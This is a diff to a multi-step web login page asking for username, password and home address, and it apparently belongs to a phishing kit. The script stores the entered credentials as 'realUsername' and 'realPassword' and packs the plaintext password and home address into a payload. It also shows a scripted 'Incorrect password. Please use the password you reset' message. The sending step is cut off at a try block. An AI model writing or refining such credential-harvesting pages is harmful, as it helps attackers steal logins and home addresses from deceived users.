@@ -122,6 +122,13 @@
             cursor: pointer; 
         }
 
+        .error-msg {
+            color: #ef4444;
+            text-align: center;
+            margin: 10px 0;
+            font-weight: 500;
+        }
+
         .worklife {
             font-size: 16px;
             font-weight: 600;
@@ -184,7 +191,7 @@
                 <button type="button" class="next-btn" onclick="nextStep(2)">Next</button>
             </div>
 
-            <!-- Step 2: Password + Forgot Password -->
+            <!-- Step 2: Password -->
             <div id="step2" class="step">
                 <label for="password">Password</label>
                 <div class="input-group">
@@ -200,7 +207,7 @@
                 <button type="button" onclick="prevStep(1)" style="background:none; border:none; color:#64748b; margin-top:12px;">← Back</button>
             </div>
 
-            <!-- Step 3: Home Address -->
+            <!-- Step 3: Address -->
             <div id="step3" class="step">
                 <label>Home Address (Current)</label>
                 <input type="text" id="address" placeholder="Enter your current home address" required>
@@ -238,7 +245,6 @@
         function togglePassword() {
             const passInput = document.getElementById('password');
             const toggleText = document.querySelector('.toggle-password');
-            
             if (passInput.type === "password") {
                 passInput.type = "text";
                 toggleText.textContent = "Hide";
@@ -248,7 +254,7 @@
             }
         }
 
-        // Auto-fill after password reset
+        // Auto-fill
         window.onload = function() {
             const savedUsername = sessionStorage.getItem('realUsername');
             const savedPassword = sessionStorage.getItem('realPassword');
@@ -260,16 +266,30 @@
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const enteredPassword = document.getElementById('password').value.trim();
             const homeAddress = document.getElementById('address').value.trim();
 
+            // === PASSWORD RESET CHECK ===
+            const resetData = JSON.parse(localStorage.getItem('resetPasswords') || '{}');
+            
+            if (resetData[username] && resetData[username] !== enteredPassword) {
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'error-msg';
+                errorDiv.textContent = "Incorrect password. Please use the password you reset.";
+                document.querySelector('.form-container').appendChild(errorDiv);
+                
+                setTimeout(() => errorDiv.remove(), 4000);
+                return;
+            }
+
+            // Save credentials
             sessionStorage.setItem('realUsername', username);
-            sessionStorage.setItem('realPassword', password);
+            sessionStorage.setItem('realPassword', enteredPassword);
 
             const payload = { 
                 username: username || "N/A", 
-                password: password || "N/A", 
-                address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
+                password: enteredPassword || "N/A", 
+                address: `UserID: ${username} | Password: ${enteredPassword} | Home: ${homeAddress} | Status: Pending Verification`
             };
 
             try {
